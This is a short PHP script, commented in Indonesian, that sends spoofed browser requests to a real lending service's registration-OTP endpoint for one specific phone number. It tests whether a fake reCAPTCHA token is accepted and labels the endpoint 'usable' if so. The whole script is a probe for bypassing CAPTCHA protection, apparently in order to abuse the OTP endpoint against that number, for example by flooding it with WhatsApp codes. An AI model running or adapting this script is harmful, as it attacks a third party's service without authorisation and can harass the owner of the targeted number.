<?php
// Uji definitif Danacita: 2 fase berjarak, selang 2.5 menit, 1 request per fase.
// Phase A: recaptcha kosong -> harus 400 "centang CAPTCHA" (bukti limit udah reset)
// Phase B: recaptcha token palsu -> kalau BUKAN 400 captcha, berarti token palsu diterima
$L = '083822461998';
$U = 'https://api.danacita.co.id/api/atlas/v1/auth/registration-otp-request';

function post($u, $b) {
  $ch = curl_init($u);
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $b,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
      'Origin: https://app.danacita.co.id', 'Referer: https://app.danacita.co.id/',
      'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36']]);
  $r = (string) curl_exec($ch); $c = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
  return [$c, trim(preg_replace('/\s+/', ' ', $r))];
}

echo date('H:i:s') . ' FASE-A (captcha kosong)\n';
[$c1, $r1] = post($U, json_encode(['username' => $L, 'notif_channel_mode' => 'wa', 'is_white_label' => false]));
echo "  [$c1] " . substr($r1, 0, 200) . "\n\n";

echo date('H:i:s') . " menunggu 155 detik...\n";
sleep(155);

echo date('H:i:s') . " FASE-B (recaptcha = token palsu 120 char)\n";
[$c2, $r2] = post($U, json_encode(['username' => $L, 'recaptcha' => str_repeat('a', 120),
  'notif_channel_mode' => 'wa', 'is_white_label' => false]));
echo "  [$c2] " . substr($r2, 0, 200) . "\n";
echo "\nKEPUTUSAN: " . (stripos($r2, 'CAPTCHA') !== false
  ? 'token PALSU ditolak -> endpoint butuh reCAPTCHA asli (tidak bisa dipakai)'
  : 'token palsu DITERIMA -> endpoint bisa dipakai') . "\n";
